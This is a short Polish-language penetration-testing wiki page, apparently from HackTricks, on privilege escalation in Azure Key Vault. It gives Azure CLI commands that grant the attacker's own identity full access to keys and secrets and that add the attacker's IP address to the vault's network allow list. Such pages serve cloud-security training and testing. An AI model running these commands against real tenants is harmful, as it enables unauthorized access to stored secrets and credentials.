# Az - Key Vault Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Azure Key Vault

Aby uzyskać więcej informacji na temat tej usługi, sprawdź:

{{#ref}}
../az-services/az-keyvault.md
{{#endref}}

### `Microsoft.KeyVault/vaults/write`

Atakujący z tym uprawnieniem będzie mógł zmodyfikować politykę skarbca kluczy (skarbiec kluczy musi używać polityk dostępu zamiast RBAC).
```bash
# If access policies in the output, then you can abuse it
az keyvault show --name <vault-name>

# Get current principal ID
az ad signed-in-user show --query id --output tsv

# Assign all permissions
az keyvault set-policy \
--name <vault-name> \
--object-id <your-object-id> \
--key-permissions all \
--secret-permissions all \
--certificate-permissions all \
--storage-permissions all
```
### Modify Network Restrictions

Możliwe, że masz wystarczające uprawnienia, aby uzyskać dostęp do wrażliwych danych (takich jak wartość sekretu), ale nie możesz się do nich dostać, ponieważ skarbiec kluczy jest ograniczony do konkretnej sieci. Jeśli masz uprawnienia do modyfikacji ograniczeń sieciowych, możesz dodać swój adres IP do listy dozwolonych adresów IP.
```bash
# Get the current network restrictions
az keyvault network-rule list --name <vault-name>

# Add your IP to the list
az keyvault network-rule add --name <vault-name> --ip-address <your-ip>
```
{{#include ../../../banners/hacktricks-training.md}}
